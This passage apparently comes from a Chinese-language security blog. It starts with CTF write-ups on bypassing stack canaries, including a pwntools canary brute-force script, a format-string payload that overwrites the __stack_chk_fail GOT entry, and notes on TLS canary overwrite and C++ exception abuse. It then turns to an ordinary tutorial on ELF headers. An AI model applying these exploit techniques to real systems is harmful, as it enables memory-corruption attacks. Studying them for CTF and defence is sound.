function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    init();</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">fun();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">wait(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_failed</code> 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>题目：ZCTF2017 Login</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222318357.png"></p><p>覆盖__stack_chk_fail 的GOT表项</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    offset = <span class="number">0x50</span>  <span class="comment"># 0x4c + 0x4   sprintf写入字符串的长度为0x4c + ebp</span></span><br><span class="line">    offset_eax = <span class="number">0x7a</span>  <span class="comment"># 0xffffd216 - 0xffffd19c = 0x7a</span></span><br><span class="line">    <span class="comment"># __stack_chk_fail GOT表中的地址，用于后面修改</span></span><br><span class="line">    payload = p32(binary.symbols[<span class="string">&#x27;got.__stack_chk_fail&#x27;</span>]) <span class="comment"># stack</span></span><br><span class="line">    <span class="comment"># sprintf写入字符串的长度为0x4c，减去前面__stack_chk_fail的地址，再加上ebp</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * (offset - <span class="number">0x4</span>)<span class="comment"># stack+ebp = offset-0x4(got.__stack_chk_fail)</span></span><br><span class="line">    <span class="comment"># 将返回地址覆盖为main函数地址，以便再次获得执行机会</span></span><br><span class="line">    payload += p32(binary.symbols[<span class="string">&#x27;main&#x27;</span>])<span class="comment"># ret addr</span></span><br><span class="line">    <span class="comment"># 填充一定字节直到可以覆盖format string</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * (offset_eax - offset + <span class="number">0x4</span>)<span class="comment"># padding 0x26</span></span><br><span class="line">    <span class="comment"># 将format string修改为如下内容</span></span><br><span class="line">    payload += <span class="string">r&#x27;%s:%39x%10$hhn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span><span class="comment"># r&#x27;&#x27;中内容不进行转义处理</span></span><br><span class="line">    <span class="comment"># %s 读取payload，使格式化字符串被覆盖</span></span><br><span class="line">    <span class="comment"># %n 配合%c或%x使用，%n负责统计输出的字符数量,写入到%n对应变量里。</span></span><br><span class="line">    <span class="comment"># 在上面的%10$hhn中，10$指第10个变量，hhn指写入一个字节</span></span><br><span class="line">    <span class="comment"># 8 alarm</span></span><br><span class="line">    <span class="comment"># 39 malloc</span></span><br></pre></td></tr></table></figure><p>代码执行完后，<code>__stack_chk_fail</code> 的GOT被覆盖为<code>malloc@plt</code>，不会触发 <code>Canary</code> 机制，同时返回到 <code>main</code> 中</p><h3 id="覆盖TLS中储存的Canary值"><a href="#覆盖TLS中储存的Canary值" class="headerlink" title="覆盖TLS中储存的Canary值"></a>覆盖TLS中储存的Canary值</h3><p>题目：<a href="https://buuoj.cn/challenges#starctf2018_babystack">StarCTF2018 babystack</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400C96);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; #   #    ####    #####  ######&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  # #    #    #     #    #&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### ###  #          #    #####&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  # #    #          #    #&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; #   #   #    #     #    #&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;          ####      #    #&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400C96);</span><br><span class="line">  pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pthread_create函数声明</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">                 <span class="type">pthread_t</span> *<span class="keyword">restrict</span> tidp,   <span class="comment">//新创建的线程ID指向的内存单元。</span></span></span><br><span class="line"><span class="params">                 <span class="type">const</span> <span class="type">pthread_attr_t</span> *<span class="keyword">restrict</span> attr,  <span class="comment">//线程属性，默认为NULL</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> *(*start_rtn)(<span class="type">void</span> *), <span class="comment">//新创建的线程从start_rtn函数的地址开始运行</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> *<span class="keyword">restrict</span> arg <span class="comment">//默认为NULL。若上述函数需要参数，将参数放入结构中并将地址作为arg传入。</span></span></span><br><span class="line"><span class="params">                  )</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建一个新的线程，该线程将执行<code>start_routine</code>函数，没有传递额外的参数，并将新线程的标识符存储在<code>newthread</code>中。</p><p><strong>线程控制块结构</strong>就是pthread，结构体 <code>tcbhead_t</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sysdeps\x86_64\nptl\tls.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;    <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">         thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;   <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;  存放单个线程的canary</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  </span><br><span class="line">  ... </span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>tcb 指针和 self 指针，实际指向的都是同一个地址，即 struct pthread 结构体（亦或者是 struct tcbhead_t 本身，这两个结构体地址相同），所以可以用</p><p><code>x/x pthread_self()</code>打印结构体的地址，快速找到<code>stack_guard</code>，<code>stack_guard</code>  存放单个线程的<code>canary</code>，<code>p/x pthread_self()</code>打印<code>canary</code>。<br>漏洞主要在start_routine中，在这个函数里有一个可以输入0x10000的漏洞</p><p>两次输入</p><p>1、栈溢出控制返回地址执行一个puts泄露libc地址，一个read，控制canary</p><p>2、向bss段写入one_gadget地址</p><h3 id="c-异常机制绕过Canary"><a href="#c-异常机制绕过Canary" class="headerlink" title="c++异常机制绕过Canary"></a>c++异常机制绕过Canary</h3><p>题目：<a href="https://www.anquanke.com/post/id/89855]">Shanghai-DCTF-2017 </a></p><p>第一个函数中，有一个异常捕获机制，但是在伪代码中并没有显示</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_401500</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_401148();</span><br><span class="line">  sub_400F8F();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bruteforcing start:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_4013AD() )</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    sub_401148();</span><br><span class="line">&#125;</span><br><span class="line">catch(<span class="type">int</span> *_ZTIi)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在sub_401148()函数里面有一个整型溢出漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400E76</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a2 - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入加一后进行无符号整型强制转换</p><p>异常抛出</p><blockquote><p>异常机制中，在编译一段 C++ 代码时，编译器会将所有 throw 语句替换为其 C++ 运行时库中的某一指定函数，这里我们叫它<code> __CxxRTThrowExp</code>。该函数接收一个编译器认可的内部结构（我们叫它 EXCEPTION 结构）。这个结构中包含了待抛出异常对象的起始地址、用于销毁它的析构函数，以及它的 type_info 信息。对于没有启用 RTTI 机制（编译器禁用了 RTTI 机制或没有在类层次结构中使用虚表）的异常类层次结构，可能还要包含其所有基类的 type_info 信息，以便与相应的 catch 块进行匹配。</p><p>__CxxRTThrowExp 首先接收（并保存）EXCEPTION 对象；然后从 TLS：Current ExpHdl 处找到与当前函数对应的 piHandler、nStep 等异常处理相关数据；并按照前文所述的机制完成异常捕获和栈回退。由此完成了包括“抛出”-&gt;“捕获”-&gt;“回退”等步骤的整套异常处理机制。</p></blockquote><p>异常捕获机制</p><blockquote><p>一个异常被抛出时，就会立即引发 C++ 的异常捕获机制： 根据 c++ 的标准，异常抛出后如果在当前函数内没有被捕捉(catch)，它就要沿着函数的调用链继续往上抛，直到走完整个调用链，或者在某个函数中找到相应的 catch。如果走完调用链都没有找到相应的 catch，那么std::terminate() 就会被调用，这个函数默认是把程序 abort，而如果最后找到了相应的 catch，就会进入该 catch 代码块，执行相应的操作。</p><p>程序中的 catch 那部分代码有一个专门的名字叫作：Landing pad（不十分准确），从抛异常开始到执行 landing pad 里的代码这中间的整个过程叫作 stack unwind，这个过程包含了两个阶段： 1）从抛异常的函数开始，对调用链上的函数逐个往前查找 landing pad。</p><p>2）如果没有找到 landing pad 则把程序 abort，否则，则记下 landing pad 的位置，再重新回到抛异常的函数那里开始，一帧一帧地清理调用链上各个函数内部的局部变量，直到 landing pad 所在的函数为止。</p><p>为了能够成功地捕获异常和正确地完成栈回退（stack unwind）</p></blockquote><p>栈回退（Stack Unwind）机制</p><blockquote><p>“回退”是伴随异常处理机制引入 C++ 中的一个新概念，主要用来确保在异常被抛出、捕获并处理后，所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收。</p></blockquote><p>简单来说就是：如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp， 而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave ret，这样就能成功绕过canary的检查，而且进一步也能控制eip，去执行了stack_pivot中的rop</p><h3 id="栈地址任意写绕过Canary检查"><a href="#栈地址任意写绕过Canary检查" class="headerlink" title="栈地址任意写绕过Canary检查"></a>栈地址任意写绕过Canary检查</h3><p>利用<strong>格式化字符串</strong>或<strong>数组下标越界</strong>，实现栈地址任意写，不必连续向栈上写，直接写ebp和ret，这样不会触发canary check</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/">canary的绕过姿势 | p1Kk’s World!</a></p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">Canary - CTF Wiki (ctf-wiki.org)</a></p></li><li><p><a href="https://www.cnblogs.com/ttxs69/p/pwn_canary.html">PWN之Canary学习 - sarace - 博客园 (cnblogs.com)</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262846">绕过canary保护的6种方法-安全客 - 安全资讯平台 (anquanke.com)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的ELF文件、链接、加载与库</title>
      <link href="/article/e72b.html"/>
      <url>/article/e72b.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux下的ELF文件、链接、加载"><a href="#Linux下的ELF文件、链接、加载" class="headerlink" title="Linux下的ELF文件、链接、加载"></a>Linux下的ELF文件、链接、加载</h1><h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><h3 id="ELF文件的三种形式"><a href="#ELF文件的三种形式" class="headerlink" title="ELF文件的三种形式"></a>ELF文件的三种形式</h3><p>ELF的全称为：Executable and Linkable Format，即 ”可执行、可链接格式“。</p><p>在Linux下，可执行文件、动态库文件、目标文件（可重定向文件）都是同一种文件格式，称之为ELF文件格式。虽然都是ELF文件格式但不相同，可以通过<code>file filename</code>查看文件的格式信息</p><ul><li>可重定向文件（relocatable）目标文件：通常是<code>.o</code>文件，包含二进制代码和数据，但它的代码及数据都没有指定绝对地址，可以在编译时与其他可重定向目标文件合并起来创建一个可执行目标文件</li><li>可执行（executable）目标文件：是完全链接的可执行文件，即静态链接的可执行文件。包含二进制代码和数据，其代码和数据都有固定的地址 （或相对于基地址的偏移 ），可以被直接复制到内存并执行</li><li>共享（shared）目标文件：通常是<code>.so</code>动态链接库文件或者动态链接生成的可执行文件。一种特殊的可重定向目标文件，可以在加载或者运行时被动态地加载进内存并链接。动态库文件和动态链接生成的文件都属于这一类。</li></ul><p>显然这里的三个ELF文件形式要么是可执行的、要么是可链接的。</p><p>还有一种core文件也属于ELF文件，在core  dumped时可以得到。</p><p><strong>在Linux中并不以后缀名作为区分文件格式的绝对标准</strong></p><h3 id="文件内部构成"><a href="#文件内部构成" class="headerlink" title="文件内部构成"></a>文件内部构成</h3><p>ELF header在文件开始处描述了整个文件的组织，节头部表（Section Tables）提供了目标文件的各项信息（如指令、数据、符号表、重定位信息等），程序头表（Program Tables）指出怎样创建进程映像，含有每个program header的入口，section header table包含每一个section的入口，给出名字、大小等信息。可以通过<code>readelf -l [fileName]</code>和<code>readelf -S [fileName]</code>来查看。</p><p>但是并不是所有以上的三种ELF形式都有这两种表</p><ul><li>如果用于编译和链接（可重定向目标文件），则编译器和链接器将把ELF文件看作是节头表描述的节的集合，程序头表可选</li><li>如果用于加载执行（可执行目标文件），则加载器将把ELF文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头部表可选。</li><li>如果是共享目标文件，则两者都有。 因为链接器在链接的时候需要节头部表来查看目标文件各个section的信息然后对各个目标文件进行链接；而加载器在加载可执行程序的时候需要程序头表，它需要根据这个表把相应的段加载到进程自己的虚拟内存中</li></ul><h4 id="ELF头"><a href="#ELF头" class="headerlink" title="ELF头"></a>ELF头</h4><p>ELF头描述了整个文件的基本信息，它位于文件的最开始的部分，大小一般为64个字节。首先是64字节的ELF头<code>Elf64_Ehdr</code>，其中包含了很多重要的信息，这些信息中有一个很关键的信息叫做Start of section headers，它指明了节头部表，Section Headers <code>Elf64_Shdr</code>的位置。段表中储存了ELF文件中各个的偏移量以记录其位置。可以使用<code>readelf -h [filename]</code>查看。ELF中的各个段可以通过<code>readelf -S [fileName]</code>来查看。</p><p>可重定向文件的文件头信息如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/111$ readelf -h main.o</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          1080 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         15</span><br><span class="line">  Section header string table index: 14</span><br></pre></td></tr></table></figure><p>可执行文件的文件头信息如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/111$ readelf -h a.out</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - GNU</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x401bc0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          869912 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         10</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         32</span><br><span class="line">  Section header string table index: 31</span><br></pre></td></tr></table></figure><p>ELF文件头的结构信息的数据结构定义在<code>/usr/include/elf.h</code>文件中, 例如64位版本的如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>e_ident[EI_NIDENT];<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Halfe_type;<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Halfe_machine;<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Worde_version;<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addre_entry;<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Offe_phoff;<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Offe_shoff;<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Worde_flags;<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Halfe_ehsize;<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Halfe_phentsize;<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Halfe_phnum;<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Halfe_shentsize;<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Halfe_shnum;<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Halfe_shstrndx;<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>32位版本如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT       16   </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_hdr</span>&#123;</span>  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT];   </span><br><span class="line">Elf32_Half    e_type;     <span class="comment">/* file type */</span>  </span><br><span class="line">Elf32_Half    e_machine;  <span class="comment">/* architecture */</span>  </span><br><span class="line">Elf32_Word e_version;  </span><br><span class="line">Elf32_Addr    e_entry;    <span class="comment">/* entry point */</span>  </span><br><span class="line">Elf32_Off e_phoff;        <span class="comment">/* PH table offset */</span>  </span><br><span class="line">Elf32_Off e_shoff;        <span class="comment">/* SH table offset */</span>  </span><br><span class="line">Elf32_Word    e_flags;  </span><br><span class="line">Elf32_Half    e_ehsize;       <span class="comment">/* ELF header size in bytes */</span>  </span><br><span class="line">Elf32_Half    e_phentsize;    <span class="comment">/* PH size */</span>  </span><br><span class="line">Elf32_Half    e_phnum;        <span class="comment">/* PH number */</span>  </span><br><span class="line">Elf32_Half    e_shentsize;    <span class="comment">/* SH size */</span>  </span><br><span class="line">Elf32_Half    e_shnum;        <span class="comment">/* SH number */</span>  </span><br><span class="line">Elf32_Half    e_shstrndx; <span class="comment">/* SH name string table index */</span>  </span><br><span class="line">&#125; Elf32_Ehdr;  </span><br></pre></td></tr></table></figure><h4 id="程序头表"><a href="#程序头表" class="headerlink" title="程序头表"></a>程序头表</h4><p>程序头表存在于可执行文件中，位于ELF文件头后面，在程序加载的时候会使用到程序头表。对于ELF文件，可以从<strong>链接角度</strong>和<strong>加载角度</strong>两方面来看，对应了链接视图与加载视图。加载视图关心的是程序头表，链接视图关心节头部表。在链接生成可执行文件时，会把多个节(section)合并对应一个段(segment)。所以节头部表中的数目少于程序头表的数目的。程序头的作用是方便程序的加载，多个节可能有相同的读写属性，把相同属性的节合并成一个段，一次性加载入内存中。</p><p>读取可执行文件的程序头表时，输出了不同的section和对应segment的对应关系</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/111$ readelf -l -W a.out</span><br><span class="line"></span><br><span class="line">Elf file type is EXEC (Executable file)</span><br><span class="line">Entry point 0x401bc0</span><br><span class="line">There are 10 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align</span><br><span class="line">  LOAD           0x000000 0x0000000000400000 0x0000000000400000 0x000518 0x000518 R   0x1000</span><br><span class="line">  LOAD           0x001000 0x0000000000401000 0x0000000000401000 0x093791 0x093791 R E 0x1000</span><br><span class="line">  LOAD           0x095000 0x0000000000495000 0x0000000000495000 0x02663d 0x02663d R   0x1000</span><br><span class="line">  LOAD           0x0bc0c0 0x00000000004bd0c0 0x00000000004bd0c0 0x005150 0x0068c0 RW  0x1000</span><br><span class="line">  NOTE           0x000270 0x0000000000400270 0x0000000000400270 0x000020 0x000020 R   0x8</span><br><span class="line">  NOTE           0x000290 0x0000000000400290 0x0000000000400290 0x000044 0x000044 R   0x4</span><br><span class="line">  TLS            0x0bc0c0 0x00000000004bd0c0 0x00000000004bd0c0 0x000020 0x000060 R   0x8</span><br><span class="line">  GNU_PROPERTY   0x000270 0x0000000000400270 0x0000000000400270 0x000020 0x000020 R   0x8</span><br><span class="line">  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x0bc0c0 0x00000000004bd0c0 0x00000000004bd0c0 0x002f40 0x002f40 R   0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     .note.gnu.property .note.gnu.build-id .note.ABI-tag .rela.plt </span><br><span class="line">   01     .init .plt .text __libc_freeres_fn .fini </span><br><span class="line">   02     .rodata .stapsdt.base .eh_frame .gcc_except_table </span><br><span class="line">   03     .tdata .init_array .fini_array .data.rel.ro .got .got.plt .data __libc_subfreeres __libc_IO_vtables __libc_atexit .bss __libc_freeres_ptrs </span><br><span class="line">   04     .note.gnu.property </span><br><span class="line">   05     .note.gnu.build-id .note.ABI-tag </span><br><span class="line">   06     .tdata .tbss </span><br><span class="line">   07     .note.gnu.property </span><br><span class="line">   08     </span><br><span class="line">   09     .tdata .init_array .fini_array .data.rel.ro .got </span><br></pre></td></tr></table></figure><h4 id="节头部表"><a href="#节头部表" class="headerlink" title="节头部表"></a>节头部表</h4><p>节头部表（section header table），它保存了文件所有节的信息。节头部表就是一个数组，第一个元素都是一个描述节信息的数据结构，使用<code>objdump -h</code>或<code>readelf -S</code>命令可以看到，节头部表位于文件的后半部分，在所有的section的后面。在ELF文件头信息中给出节头部表在文件中的偏移位置（Start of section headers）</p><p>使用readelf工具显示的重定位文件中的节头部表信息如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/111$ readelf -S main.o</span><br><span class="line">There are 15 section headers, starting at offset 0x438:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  